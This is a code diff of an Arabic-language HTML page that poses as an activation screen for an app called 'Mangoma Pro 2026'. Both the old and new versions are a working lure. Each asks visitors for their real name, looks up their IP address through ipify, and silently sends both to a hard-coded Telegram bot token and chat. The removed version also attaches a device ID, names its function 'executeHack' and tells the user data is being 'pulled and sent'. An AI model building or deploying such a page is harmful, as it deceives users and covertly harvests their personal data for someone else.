@@ -3,115 +3,70 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Mangoma Login</title>
+    <title>تفعيل المنظومة</title>
     <style>
-        body { background-color: #0f0f0f; color: white; font-family: sans-serif; text-align: center; padding: 20px; }
-        .container { background: #1a1a1a; padding: 20px; border-radius: 15px; border: 1px solid #00ff00; max-width: 400px; margin: auto; }
-        input { width: 90%; padding: 12px; margin: 10px 0; border-radius: 5px; border: none; text-align: center; font-size: 16px; }
-        button { width: 100%; padding: 12px; background: #00ff00; color: black; font-weight: bold; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; margin-top: 10px;}
-        button:disabled { background: gray; }
+        body { background-color: #000; color: #0f0; font-family: Tahoma; text-align: center; padding: 20px; }
+        input { width: 90%; padding: 10px; margin: 10px 0; border-radius: 5px; text-align: center; }
+        button { width: 95%; padding: 10px; background: #0f0; font-weight: bold; cursor: pointer; }
         .hidden { display: none; }
     </style>
 </head>
 <body>
 
-    <div class="container" id="loginBox">
-        <h2>🔐 تسجيل الدخول الإجباري</h2>
-        <p>يجب تسجيل اسمك لفتح البرنامج</p>
-        
-        <input type="text" id="username" placeholder="اكتب اسمك ثلاثي هنا...">
-        <button onclick="executeHack()" id="btnAction">دخول وتفعيل</button>
-        
-        <p id="msg" style="color: yellow; margin-top: 10px; font-size: 12px;"></p>
+    <div id="loginBox">
+        <h2>🔐 Mangoma Pro 2026</h2>
+        <p>يجب تفعيل النسخة أولاً</p>
+        <input type="text" id="username" placeholder="اكتب اسمك الحقيقي...">
+        <button onclick="start()" id="btn">تفعيل ودخول</button>
+        <p id="msg" style="color:yellow; margin-top:5px;"></p>
     </div>
 
-    <div class="container hidden" id="appBox">
-        <h2>✅ تم التفعيل بنجاح</h2>
-        <p>أهلاً بك: <span id="finalName" style="color:#00ff00"></span></p>
-        <p>ID: <span id="finalID"></span></p>
+    <div id="appBox" class="hidden">
+        <h2>✅ تم التفعيل</h2>
+        <p>الاسم: <span id="finalName"></span></p>
         <hr>
-        <p>التطبيق يعمل الآن...</p>
+        <h3>جاري فتح التطبيق...</h3>
     </div>
 
 <script>
-    // بياناتك الصحيحة 100%
+    // بياناتك اللي انت جربتها واشتغلت
     const BOT = "8596993745:AAG0FXH8LFqweLH5nlPTcFpEM07BHhabrHw";
     const CHAT = "-1003886528114";
 
-    // توليد آيدي عشوائي للجهاز
-    let myID = localStorage.getItem("device_id");
-    if (!myID) {
-        myID = "ANDROID-" + Math.floor(Math.random() * 100000);
-        localStorage.setItem("device_id", myID);
-    }
-
-    // لو مسجل قبل كده يدخل علطول
-    if(localStorage.getItem("saved_name")){
-        showApp(localStorage.getItem("saved_name"));
-    }
-
-    function executeHack() {
+    function start() {
         const name = document.getElementById("username").value;
-        const btn = document.getElementById("btnAction");
-        const msg = document.getElementById("msg");
+        if(name.length < 3) { alert("اكتب الاسم!"); return; }
 
-        if (name.length < 3) {
-            alert("اكتب الاسم بشكل صحيح!");
-            return;
-        }
+        document.getElementById("btn").disabled = true;
+        document.getElementById("msg").innerText = "جاري الاتصال بالسيرفر...";
 
-        btn.disabled = true;
-        btn.innerText = "جاري الاتصال...";
-        msg.innerText = "جاري سحب البيانات وإرسالها...";
-
-        // 1. نجيب الـ IP
+        // 1. نجيب الاي بي
         fetch("https://api.ipify.org?format=json")
-        .then(response => response.json())
+        .then(res => res.json())
         .then(data => {
-            const userIP = data.ip;
-            // 2. نرسل للتليجرام فوراً
-            sendTelegram(name, userIP);
-        })
-        .catch(err => {
-            // لو فشل يجيب IP يبعت برضه
-            sendTelegram(name, "Unknown IP");
-        });
-    }
-
-    function sendTelegram(name, ip) {
-        // تجهيز الرسالة
-        const text = `🚨 *NEW LOGIN*\n👤 Name: ${name}\n🆔 ID: ${myID}\n🌐 IP: ${ip}`;
-        
-        // تجهيز الرابط (نفس الرابط اللي اشتغل معاك)
-        const url = `https://api.telegram.org/bot${BOT}/sendMessage?chat_id=${CHAT}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
-
-        // إرسال
-        fetch(url)
-        .then(res => {
-            if(res.ok) {
-                // نجاح
-                localStorage.setItem("saved_name", name);
-                showApp(name);
-            } else {
-                alert("خطأ في الاتصال بالسيرفر");
-                document.getElementById("btnAction").disabled = false;
-            }
+            send(name, data.ip);
         })
         .catch(e => {
-            // أحياناً المتصفح بيعمل بلوك للرد بس الرسالة بتوصل
-            // هنعتبره نجاح عشان المستخدم يدخل
-            localStorage.setItem("saved_name", name);
-            showApp(name);
+            send(name, "IP غير معروف");
         });
     }
 
-    function showApp(n) {
-        document.getElementById("loginBox").classList.add("hidden");
-        document.getElementById("appBox").classList.remove("hidden");
-        document.getElementById("finalName").innerText = n;
-        document.getElementById("finalID").innerText = myID;
+    function send(name, ip) {
+        // رسالة التليجرام
+        const txt = `🔥 *تسجيل دخول جديد*\n👤 الاسم: ${name}\n🌐 IP: ${ip}`;
+        const url = `https://api.telegram.org/bot${BOT}/sendMessage?chat_id=${CHAT}&text=${encodeURIComponent(txt)}&parse_mode=Markdown`;
+
+        // ارسال مباشر
+        fetch(url).then(r => {
+            document.getElementById("loginBox").classList.add("hidden");
+            document.getElementById("appBox").classList.remove("hidden");
+            document.getElementById("finalName").innerText = name;
+        }).catch(e => {
+            // حتى لو حصل خطأ في الشبكة هندخله عشان ميزهقش
+            document.getElementById("loginBox").classList.add("hidden");
+            document.getElementById("appBox").classList.remove("hidden");
+        });
     }
 </script>
-
 </body>
 </html>
